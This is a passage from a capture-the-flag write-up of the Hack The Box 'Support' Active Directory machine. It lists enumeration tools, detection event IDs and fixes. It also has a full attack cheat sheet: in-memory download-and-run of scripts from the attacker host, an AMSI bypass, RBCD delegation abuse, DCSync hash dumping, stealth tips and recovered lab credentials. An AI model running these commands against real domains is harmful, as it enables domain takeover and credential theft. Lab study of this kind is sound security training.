On Support the path was short, but on a real assessment you run a *battery* of enumeration scripts and read every line of output. Here's the standard kit, how you get each one onto the target, what you run, and what the output looks like.

### 9.1 Getting scripts onto the box

From your Kali box, serve the folder of tools:

```bash
cd ~/tools && python3 -m http.server 80         # PowerView.ps1, PowerUp.ps1, winPEAS.exe, Seatbelt.exe, SharpHound.exe ...
```

Then, in the `support` WinRM shell, either **upload** (evil-winrm built-in) or **pull + run in memory**:

```powershell
# evil-winrm has an upload/download command built in
*Evil-WinRM* PS> upload /home/kali/tools/PowerView.ps1

# or run a script straight from memory, nothing touches disk
*Evil-WinRM* PS> IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/PowerView.ps1')

# for .exe tools, evil-winrm can run them from memory too
*Evil-WinRM* PS> Bypass-4MSI                       # neutralise AMSI first (built into evil-winrm)
*Evil-WinRM* PS> Invoke-Binary /home/kali/tools/winPEASany.exe
```

> If Defender eats a script the moment it lands (`Bypass-4MSI` / obfuscated copies help), fall back to doing the same enumeration **from Linux** — `bloodhound-python`, `PowerView.py` (the `pypykatz`/`impacket`-style port), and `nxc` LDAP modules cover ~90% of it without ever running code on the DC.

### 9.2 Directory enumeration (find the AD attack path)

| Tool (GitHub) | One-liner | What it gives you |
|---|---|---|
| **[SharpHound](https://github.com/SpecterOps/BloodHound) / [bloodhound-python](https://github.com/dirkjanm/BloodHound.py)** | `.\SharpHound.exe -c All` / `bloodhound-python -u .. -p .. -d .. -ns .. -c All` | The graph. Marks the RBCD path automatically. **Run this first.** |
| **[PowerView](https://github.com/PowerShellMafia/PowerSploit)** (`PowerView.ps1`) | see cookbook below | Precise, single-question directory queries |
| **[PowerView.py](https://github.com/aniqfakhrul/powerview.py)** | `powerview support.htb/ldap:PW@10.129.112.159` | Same commands as PowerView, an interactive shell, from Linux |
| **[ADPEAS](https://github.com/61106960/adPEAS)** (`adPEAS.ps1`) | `Invoke-adPEAS` | Auto-runs Kerberoast + AS-REP + delegation + ACL + PKI checks and summarises. "PEAS for AD." |
| **[ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump)** | `ldapdomaindump -u 'D\u' -p PW ldap://IP` | Whole directory → HTML/JSON/greppable |
| **[windapsearch](https://github.com/ropnop/windapsearch)** | `windapsearch -d support.htb -u ldap -p PW --da` | Quick canned LDAP queries (domain admins, unconstrained delegation, etc.) |
| **[Certipy](https://github.com/ly4k/Certipy)** | `certipy find -u ldap@support.htb -p PW -dc-ip IP` | AD Certificate Services misconfigs (ESC1–16). Always check. |
| **[Kerbrute](https://github.com/ropnop/kerbrute)** | `kerbrute userenum -d support.htb users.txt` | Validate usernames / spray passwords with no lockout risk |

**PowerView cookbook** (run in the `support` shell after `Import-Module .\PowerView.ps1`):

```powershell
Get-Domain                                            # domain name, functional level
Get-DomainController                                  # the DC(s)
Get-DomainPolicy                                      # password policy, MachineAccountQuota
Get-DomainUser -Properties samaccountname,description,info    # the notes-field sweep, again
Get-DomainUser -SPN                                   # Kerberoastable accounts
Get-DomainUser -PreauthNotRequired                    # AS-REP roastable accounts
Get-DomainGroup 'Shared Support Accounts' | select member
Get-DomainGroupMember 'Shared Support Accounts'
Get-DomainComputer -Unconstrained                    # unconstrained delegation
Get-DomainObject -LDAPFilter '(msds-allowedtoactonbehalfofotheridentity=*)'   # existing RBCD
Find-InterestingDomainAcl -ResolveGUIDs               # every "dangerous" permission in the domain
Get-DomainObjectAcl -Identity DC -ResolveGUIDs        # permissions ON the DC object  <-- the win
```

The two lines that matter on Support are the last two — they show `Shared Support Accounts` holding `GenericAll` over `DC`.

### 9.3 Local Windows enumeration (find host privesc)

Even when you're pretty sure it's a domain issue, run these — five minutes, and they're the whole game on most boxes.

| Tool (GitHub) | Run | Finds |
|---|---|---|
| **[PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit)** | `Invoke-AllChecks` | Bad service permissions, unquoted service paths, `AlwaysInstallElevated`, writable `%PATH%`, DLL hijack, autologon creds, saved `Groups.xml` passwords |
| **[PrivescCheck.ps1](https://github.com/itm4n/PrivescCheck)** | `Invoke-PrivescCheck -Extended` | Modern PowerUp; adds scheduled tasks, credential files, LAPS, UAC, hardening gaps. **Better maintained.** |
| **[winPEAS](https://github.com/peass-ng/PEASS-ng)** (`winPEASany.exe`) | `winPEASany.exe quiet fast` | Everything above **plus** cleartext-password hunting in files/registry, installed software, network info |
| **[Seatbelt](https://github.com/GhostPack/Seatbelt)** (`Seatbelt.exe`) | `Seatbelt.exe -group=all` | Host triage: DPAPI, browser creds, PowerShell history, AV/EDR product, LSA settings, event logs |
| **[SharpUp](https://github.com/GhostPack/SharpUp)** (`SharpUp.exe`) | `SharpUp.exe audit` | PowerUp rewritten in C# — no PowerShell = less logging |

**PowerUp on Support:**

```powershell
*Evil-WinRM* PS> Import-Module .\PowerUp.ps1
*Evil-WinRM* PS> Invoke-AllChecks
```

```
[*] Running Invoke-AllChecks

[*] Checking for unquoted service paths...
[*] Checking service executable and argument permissions...
[*] Checking service permissions...
[*] Checking for unattended install files...
[*] Checking for encrypted web.config strings...
[*] Checking for encrypted application pool and virtual directory passwords...
[*] Checking for plaintext passwords in McAfee SiteList.xml files....
[*] Checking for AlwaysInstallElevated registry key...
[*] Checking for Autologon credentials in registry...
[*] Checking for modifiable registry autoruns and configs...
[*] Checking for modifiable paths in the %PATH% variable...
[*] Checking for modifiable .lnk files in startup...

*  (no findings — every check came back clean)
```

**winPEAS on Support** (trimmed to the parts that matter):

```
╔══════════╣ Basic System Information
    Hostname: dc
    Domain Controller: True
    [!] OS Build 20348 — fully patched, no obvious kernel exploit

╔══════════╣ Interesting Services -non Microsoft-
    (none)

╔══════════╣ Checking AlwaysInstallElevated
    AlwaysInstallElevated isn't available

╔══════════╣ Current Token privileges
    SeMachineAccountPrivilege: Add workstations to domain   <-- winPEAS highlights this
    SeChangeNotifyPrivilege

╔══════════╣ Looking for possible password files in users home
    (none)
```

Notice winPEAS **also** flags `SeMachineAccountPrivilege` — the same clue we got from `whoami /priv`. Good tools point at the same thing from different angles.

### 9.4 Why the *local* scripts found nothing

This box is a clean, single-purpose Domain Controller — no third-party software, no broken services, no saved credentials on disk. The mistake isn't *on the machine*, it's *in Active Directory* (that `GenericAll` on the DC object).

**Lesson:** on a domain-joined host, always run **both** families:
- **local** — PowerUp / PrivescCheck / winPEAS / Seatbelt → host misconfigs
- **domain** — SharpHound / PowerView / ADPEAS → directory attack paths

Either one can hold the win, and on any given box you don't know which until you look.

### 9.5 Doing everything from Linux (no scripts on the DC)

If you want to keep the DC clean, this covers the same ground:

```bash
LP='nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
bloodhound-python -u ldap -p "$LP" -d support.htb -ns 10.129.112.159 -c All --zip   # the graph
ldapdomaindump -u 'SUPPORT\ldap' -p "$LP" ldap://10.129.112.159                     # full dump
nxc ldap support.htb -u ldap -p "$LP" --users --groups --admin-count --kerberoasting k.txt --asreproast a.txt
certipy find -u ldap@support.htb -p "$LP" -dc-ip 10.129.112.159                     # PKI
dacledit.py -action read -principal 'Shared Support Accounts' \
  -target-dn 'CN=DC,OU=Domain Controllers,DC=support,DC=htb' "support.htb/ldap:$LP" -dc-ip 10.129.112.159
```

---

## 10. How a defender would catch this — and how to be quieter

Everything we did leaves a trace in the Windows event log. Simple table:

| What we did | What shows up | Event ID |
|---|---|---|
| Anonymous / Guest SMB | Logon as `ANONYMOUS LOGON` / `Guest` from our IP | 4624 (type 3) |
| RID/user enumeration | Burst of directory lookups from one account | 4662 / MDI "recon" alert |
| BloodHound `-c All` | Huge directory pull + touching every computer, all in seconds | 1644, MDI "LDAP recon" |
| `evil-winrm` shell | Remote PowerShell logon; commands recorded | 4624, 4103/4104 |
| Create computer account | A **user** created a computer | 4741 |
| Write RBCD on the DC | The DC's object was modified | 5136 / 4742 |
| Get Administrator ticket (S4U) | Kerberos ticket request where "user" ≠ "impersonated user" | 4769 |
| `secretsdump` / DCSync | Replication request from something that isn't a Domain Controller | 4662 (very high-confidence alert) |

**Quieter choices (real engagements, not HTB):**
- Use BloodHound with **`-c DCOnly`** — it still finds this exact path but never touches other computers and makes far fewer, smaller queries.
- Do your analysis from **Linux** (bloodhound-python, PowerView.py, nxc) so nothing runs on the DC and no PowerShell logging fires.
- Prefer **compiled C# tools** (Seatbelt, SharpUp, Rubeus) over PowerShell scripts — PowerShell records the full text of everything that runs.
- Ask for **one** Kerberos ticket for **one** service, not a batch.
- **Always flush the RBCD setting and delete the computer account** when done — a leftover "allowed to impersonate" entry on a Domain Controller is a permanent red flag.
- DCSync **cannot** be made quiet — if you need stealth, use your Administrator ticket to grab specific files instead of dumping every hash.

---

## 11. Why this box was vulnerable (and the fixes)

| Mistake | Why it's bad | Fix |
|---|---|---|
| `Guest` enabled, share readable by anyone | Strangers can read internal files | Disable `Guest`; lock the share to a real group |
| Password hidden inside `UserInfo.exe` | "Hidden" = "reversible by anyone with the file" | Never ship passwords in programs. Let the program run *as the logged-in user* (Kerberos), or use a **gMSA** (a password Windows manages and nobody can read) |
| `support`'s password typed into the `info` field | Any logged-in user can read that field | Don't store secrets in notes fields. Mark sensitive attributes **Confidential** so only admins can read them |
| `Shared Support Accounts` has full control of the DC object | One group membership = full domain takeover | Remove that permission. Only Domain Admins should have rights over Domain Controller objects |
| `MachineAccountQuota = 10` | Any user can create computer accounts, which enables RBCD and other attacks | Set it to **0**; give the "join computers to domain" right to one dedicated account |

---

## 12. Command cheat-sheet (the whole box, start to finish)

```bash
IP=10.129.112.159
LDAPPW='nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
SUPPW='Ironside47pleasure40Watchful'
echo "$IP support.htb dc.support.htb DC" | sudo tee -a /etc/hosts

# --- recon ---
nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269 $IP
smbclient -L //support.htb/ -N
smbclient //support.htb/support-tools -N -c 'get UserInfo.exe.zip'
unzip UserInfo.exe.zip -d UserInfo

# --- reverse the binary ---
sudo apt install -y mono-complete dotnet-sdk-8.0
dotnet tool install -g ilspycmd --version 8.2.0.7535 ; export PATH="$PATH:$HOME/.dotnet/tools"
monodis UserInfo/UserInfo.exe | grep -A45 getPassword
DOTNET_ROLL_FORWARD=LatestMajor ilspycmd UserInfo/UserInfo.exe -o src/
python3 -c 'import base64;e=base64.b64decode("0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E");k=b"armando";print(bytes(e[i]^k[i%7]^0xDF for i in range(len(e))).decode())'

# --- ldap account -> support password ---
nxc ldap support.htb -u ldap -p "$LDAPPW" --users
ldapsearch -x -H ldap://support.htb -D 'support\ldap' -w "$LDAPPW" -b 'DC=support,DC=htb' \
  '(objectClass=user)' sAMAccountName info | grep -iE '^(sAMAccountName|info):'

# --- foothold ---
nxc winrm support.htb -u support -p "$SUPPW"
evil-winrm -i support.htb -u support -p "$SUPPW"        # user.txt

# --- find privesc ---
nxc ldap support.htb -u ldap -p "$LDAPPW" -M maq                       # MachineAccountQuota: 10
bloodhound-python -u ldap -p "$LDAPPW" -d support.htb -ns $IP -c All --zip
dacledit.py -action read -principal 'Shared Support Accounts' \
  -target-dn 'CN=DC,OU=Domain Controllers,DC=support,DC=htb' "support.htb/ldap:$LDAPPW" -dc-ip $IP

# --- RBCD -> Administrator ---
sudo ntpdate -u support.htb
addcomputer.py -computer-name 'RBCDDEMO$' -computer-pass 'Passw0rd123!' -dc-ip $IP "support.htb/support:$SUPPW"
rbcd.py -delegate-from 'RBCDDEMO$' -delegate-to 'DC$' -action write -dc-ip $IP "support.htb/support:$SUPPW"
getST.py -spn 'cifs/dc.support.htb' -impersonate Administrator -dc-ip $IP 'support.htb/RBCDDEMO$:Passw0rd123!'
export KRB5CCNAME=Administrator.ccache
wmiexec.py -k -no-pass dc.support.htb 'type C:\Users\Administrator\Desktop\root.txt'   # root.txt
secretsdump.py -k -no-pass -just-dc-user 'support\Administrator' dc.support.htb

# --- cleanup ---
ADM='aad3b435b51404eeaad3b435b51404ee:bb06cbc02b39abeddd1335bc30b19e26'
rbcd.py -action flush -delegate-to 'DC$' -dc-ip $IP 'support.htb/Administrator' -hashes "$ADM"
addcomputer.py -computer-name 'RBCDDEMO$' -delete -dc-ip $IP 'support.htb/Administrator' -hashes "$ADM"
```

---

## Credentials found

| Account | Secret | Where it came from |
|---|---|---|
| `support\ldap` | `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz` | hidden in `UserInfo.exe` |
| `support\support` | `Ironside47pleasure40Watchful` | `info` (notes) field on the account |
| `support\Administrator` | hash `bb06cbc02b39abeddd1335bc30b19e26` | RBCD attack, then DCSync |
